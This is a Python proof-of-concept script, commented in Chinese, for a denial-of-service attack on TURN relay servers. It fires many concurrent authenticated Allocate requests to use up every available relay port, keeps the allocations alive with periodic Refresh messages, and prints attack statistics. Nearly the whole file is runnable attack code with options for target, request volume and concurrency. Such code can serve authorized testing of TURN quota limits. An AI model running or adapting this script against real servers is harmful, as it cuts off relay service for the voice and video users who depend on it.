#!/usr/bin/env python3
"""
TURN DoS攻击POC - 攻击1：短时间发送n个allocation请求，占满所有可申请的中继端口
"""

import socket
import struct
import time
import argparse
import sys
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
TURN_UTILS_DIR = os.path.join(CURRENT_DIR, "turn_utils")

for path in (CURRENT_DIR, TURN_UTILS_DIR):
    if path not in sys.path:
        sys.path.insert(0, path)

from turn_utils.test_turn_capabilities import allocate_with_fallback
from turn_utils.turn_client import (
    STUN_ATTR_USERNAME,
    STUN_ATTR_REALM,
    STUN_ATTR_NONCE,
    STUN_ATTR_MESSAGE_INTEGRITY,
    STUN_ATTR_FINGERPRINT,
    STUN_ATTR_LIFETIME,
    STUN_MAGIC_COOKIE,
    resolve_server_address
)
# 直接从turn_client导入这些函数
import turn_utils.turn_client as turn_client
gen_tid = turn_client.gen_tid
stun_attr = turn_client.stun_attr
build_msg = turn_client.build_msg
parse_attrs = turn_client.parse_attrs
from config import DEFAULT_TURN_SERVER, DEFAULT_TURN_PORT

# STUN/TURN Refresh 常量（RFC 8656）
STUN_REFRESH_REQUEST = 0x0004
STUN_REFRESH_SUCCESS_RESPONSE = 0x0104
STUN_REFRESH_ERROR_RESPONSE = 0x0114
STUN_ATTR_ERROR_CODE = 0x0009

# 全局统计
stats = {
    'total_requests': 0,
    'successful_allocations': 0,
    'failed_allocations': 0,
    'active_allocations': 0,
    'errors': defaultdict(int)
}
stats_lock = threading.Lock()

# 存储活跃的allocation
active_allocations = []
allocations_lock = threading.Lock()

def refresh_allocation(sock, nonce, realm, integrity_key, server_address, username=None, lifetime=None, mi_algorithm=None):
    """
    刷新TURN分配
    
    Returns:
        (success, lifetime_value) 或 (False, None)
    """
    from turn_utils.turn_client import (
        build_msg_with_short_term_credential,
        build_msg_with_short_term_credential_sha256_only,
        build_msg_with_short_term_credential_sha1_only,
        USERNAME
    )
    
    auth_username = username or USERNAME
    
    tid = gen_tid()
    attrs = [
        stun_attr(STUN_ATTR_USERNAME, auth_username.encode()),
    ]
    
    if realm is not None:
        attrs.append(stun_attr(STUN_ATTR_REALM, realm))
    if nonce is not None:
        attrs.append(stun_attr(STUN_ATTR_NONCE, nonce))
    
    if lifetime is not None:
        attrs.append(stun_attr(STUN_ATTR_LIFETIME, struct.pack("!I", lifetime)))
    
    if nonce is None and realm is None:
        if mi_algorithm == 'sha256':
            req = build_msg_with_short_term_credential_sha256_only(STUN_REFRESH_REQUEST, tid, attrs, integrity_key, add_fingerprint=True)
        elif mi_algorithm == 'sha1':
            req = build_msg_with_short_term_credential_sha1_only(STUN_REFRESH_REQUEST, tid, attrs, integrity_key, add_fingerprint=True)
        else:
            req = build_msg_with_short_term_credential(STUN_REFRESH_REQUEST, tid, attrs, integrity_key, add_fingerprint=True)
    else:
        req = build_msg(STUN_REFRESH_REQUEST, tid, attrs, integrity_key, add_fingerprint=True)
    
    is_tcp_socket = False
    if hasattr(sock, '_sslobj') or sock.__class__.__name__ == 'SSLSocket':
        is_tcp_socket = True
    elif hasattr(sock, 'type'):
        try:
            sock_type = sock.type
            if (sock_type == socket.SOCK_STREAM or 
                (hasattr(sock_type, 'value') and getattr(sock_type, 'value', None) == 1) or
                int(sock_type) == 1):
                is_tcp_socket = True
        except (ValueError, TypeError, AttributeError):
            pass
    
    if not is_tcp_socket:
        try:
            sock.getpeername()
            is_tcp_socket = True
        except (AttributeError, OSError, socket.error):
            pass
    
    try:
        if is_tcp_socket:
            sock.send(req)
            sock.settimeout(10)
            data = sock.recv(2000)
        else:
            sock.sendto(req, server_address)
            sock.settimeout(10)
            data, _ = sock.recvfrom(2000)
        
        msg_type, tid, attrs = parse_attrs(data)
        
        if msg_type == STUN_REFRESH_SUCCESS_RESPONSE:
            lifetime_value = None
            if STUN_ATTR_LIFETIME in attrs:
                lifetime_value = struct.unpack("!I", attrs[STUN_ATTR_LIFETIME])[0]
            return True, lifetime_value
        elif msg_type == STUN_REFRESH_ERROR_RESPONSE:
            return False, None
        else:
            return False, None
    except (socket.timeout, Exception):
        return False, None

def keep_allocation_alive(allocation_info, server_address, username, refresh_interval=300):
    """
    保持allocation活跃，定期发送refresh请求
    
    Args:
        allocation_info: (sock, nonce, realm, integrity_key, actual_server_address, mi_algorithm)
        server_address: TURN服务器地址
        username: 用户名
        refresh_interval: refresh间隔（秒）
    """
    sock, nonce, realm, integrity_key, actual_server_address, mi_algorithm = allocation_info
    
    try:
        while True:
            time.sleep(refresh_interval)
            success, lifetime = refresh_allocation(sock, nonce, realm, integrity_key, 
                                                   server_address, username, 
                                                   mi_algorithm=mi_algorithm)
            if not success:
                # refresh失败，从活跃列表中移除
                with allocations_lock:
                    if allocation_info in active_allocations:
                        active_allocations.remove(allocation_info)
                with stats_lock:
                    stats['active_allocations'] = len(active_allocations)
                sock.close()
                break
    except Exception as e:
        # 发生异常，从活跃列表中移除
        with allocations_lock:
            if allocation_info in active_allocations:
                active_allocations.remove(allocation_info)
        with stats_lock:
            stats['active_allocations'] = len(active_allocations)
        try:
            sock.close()
        except:
            pass

def attempt_allocation(server_address, username, password, realm, server_hostname, allocation_id):
    """
    尝试单个allocation请求
    
    Returns:
        (success, allocation_info, error_msg) 或 (False, None, error_msg)
    """
    try:
        with stats_lock:
            stats['total_requests'] += 1
        
        result, is_short_term = allocate_with_fallback(
            server_address,
            username,
            password,
            realm,
            server_hostname,
        )
        
        if result:
            sock, nonce, realm, integrity_key, actual_server_address, *extra = result
            mi_algorithm = extra[0] if extra else None
            allocation_info = (sock, nonce, realm, integrity_key, actual_server_address, mi_algorithm)
            
            with allocations_lock:
                active_allocations.append(allocation_info)
            
            with stats_lock:
                stats['successful_allocations'] += 1
                stats['active_allocations'] = len(active_allocations)
            
            print(f"[+] Allocation #{allocation_id} successful (Total: {stats['successful_allocations']}/{stats['total_requests']})")
            return True, allocation_info, None
        else:
            with stats_lock:
                stats['failed_allocations'] += 1
                stats['errors']['allocation_failed'] += 1
            
            print(f"[-] Allocation #{allocation_id} failed (Total: {stats['failed_allocations']}/{stats['total_requests']})")
            return False, None, "Allocation failed"
    
    except Exception as e:
        error_msg = str(e)
        with stats_lock:
            stats['failed_allocations'] += 1
            stats['errors'][error_msg] += 1
        
        print(f"[-] Allocation #{allocation_id} error: {error_msg}")
        return False, None, error_msg

def print_stats():
    """打印统计信息"""
    with stats_lock:
        print("\n" + "="*70)
        print("📊 攻击统计")
        print("="*70)
        print(f"总请求数: {stats['total_requests']}")
        print(f"成功分配: {stats['successful_allocations']}")
        print(f"失败分配: {stats['failed_allocations']}")
        print(f"活跃分配: {stats['active_allocations']}")
        if stats['errors']:
            print("\n错误统计:")
            for error, count in stats['errors'].items():
                print(f"  {error}: {count}")
        print("="*70 + "\n")

def main():
    parser = argparse.ArgumentParser(description='TURN DoS攻击POC - 攻击1：占满所有可申请的中继端口')
    parser.add_argument('--turn-server', required=True, help='TURN服务器地址（域名或IP）')
    parser.add_argument('--turn-port', type=int, help='TURN服务器端口')
    parser.add_argument('--username', required=True, help='TURN服务器用户名')
    parser.add_argument('--password', required=True, help='TURN服务器密码')
    parser.add_argument('--realm', help='TURN服务器认证域')
    parser.add_argument('--num-requests', type=int, default=100, help='要发送的allocation请求数量（默认: 100）')
    parser.add_argument('--concurrent', type=int, default=10, help='并发请求数（默认: 10）')
    parser.add_argument('--keep-alive', action='store_true', default=True, help='保持allocation活跃（定期refresh，默认启用）')
    parser.add_argument('--no-keep-alive', dest='keep_alive', action='store_false', help='禁用保持allocation活跃')
    parser.add_argument('--refresh-interval', type=int, default=300, help='Refresh间隔（秒，默认: 300）')
    parser.add_argument('--monitor-interval', type=int, default=5, help='统计信息打印间隔（秒，默认: 5）')
    parser.add_argument('--stop-on-full', action='store_true', help='当无法再分配时停止（检测到486错误）')
    
    args = parser.parse_args()
    
    print("="*70)
    print("🚨 TURN DoS攻击POC - 攻击1")
    print("="*70)
    
    # 解析TURN服务器地址
    server_address = resolve_server_address(args.turn_server, args.turn_port or DEFAULT_TURN_PORT)
    if not server_address:
        print("[-] Failed to resolve TURN server address")
        return
    
    print(f"[+] TURN Server: {server_address}")
    print(f"[+] Username: {args.username}")
    print(f"[+] 请求数量: {args.num_requests}")
    print(f"[+] 并发数: {args.concurrent}")
    print(f"[+] 保持活跃: {args.keep_alive}")
    if args.keep_alive:
        print(f"[+] Refresh间隔: {args.refresh_interval}秒")
    print()
    
    # 启动统计信息监控线程
    stop_monitoring = threading.Event()
    
    def monitor_stats():
        while not stop_monitoring.is_set():
            time.sleep(args.monitor_interval)
            print_stats()
    
    monitor_thread = threading.Thread(target=monitor_stats, daemon=True)
    monitor_thread.start()
    
    # 启动keep-alive线程池
    keep_alive_executor = None
    if args.keep_alive:
        keep_alive_executor = ThreadPoolExecutor(max_workers=args.concurrent * 2)
    
    start_time = time.time()
    
    try:
        # 使用线程池并发发送allocation请求
        with ThreadPoolExecutor(max_workers=args.concurrent) as executor:
            futures = []
            
            for i in range(args.num_requests):
                future = executor.submit(
                    attempt_allocation,
                    server_address,
                    args.username,
                    args.password,
                    args.realm,
                    args.turn_server,
                    i + 1
                )
                futures.append(future)
                
                # 如果设置了stop-on-full，检查是否已经无法分配
                if args.stop_on_full and stats['failed_allocations'] > 0:
                    # 检查最近的失败是否是因为配额已满
                    # 这里简化处理，如果连续失败多次就停止
                    if stats['failed_allocations'] >= 10 and stats['successful_allocations'] == 0:
                        print("[!] 检测到可能无法分配，停止发送新请求")
                        break
            
            # 等待所有请求完成
            for future in as_completed(futures):
                success, allocation_info, error_msg = future.result()
                
                # 如果成功且需要保持活跃，启动keep-alive线程
                if success and args.keep_alive and allocation_info:
                    keep_alive_executor.submit(
                        keep_allocation_alive,
                        allocation_info,
                        server_address,
                        args.username,
                        args.refresh_interval
                    )
    
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
    except Exception as e:
        print(f"\n[-] 错误: {e}")
        import traceback
        traceback.print_exc()
    finally:
        stop_monitoring.set()
        print_stats()
        
        elapsed_time = time.time() - start_time
        print(f"\n[+] 攻击完成，耗时: {elapsed_time:.2f}秒")
        print(f"[+] 成功分配: {stats['successful_allocations']}/{stats['total_requests']}")
        print(f"[+] 当前活跃分配: {stats['active_allocations']}")
        
        if args.keep_alive:
            print(f"\n[+] 保持活跃模式已启用，allocation将持续刷新...")
            print(f"[+] 按 Ctrl+C 停止并清理所有allocation")
            
            try:
                while True:
                    time.sleep(1)
                    if stats['active_allocations'] == 0:
                        print("[!] 所有allocation已失效")
                        break
            except KeyboardInterrupt:
                print("\n[!] 清理所有allocation...")
                with allocations_lock:
                    for allocation_info in active_allocations[:]:
                        try:
                            sock = allocation_info[0]
                            sock.close()
                        except:
                            pass
                    active_allocations.clear()
                print("[+] 清理完成")
        
        if keep_alive_executor:
            keep_alive_executor.shutdown(wait=False)

if __name__ == "__main__":
    main()

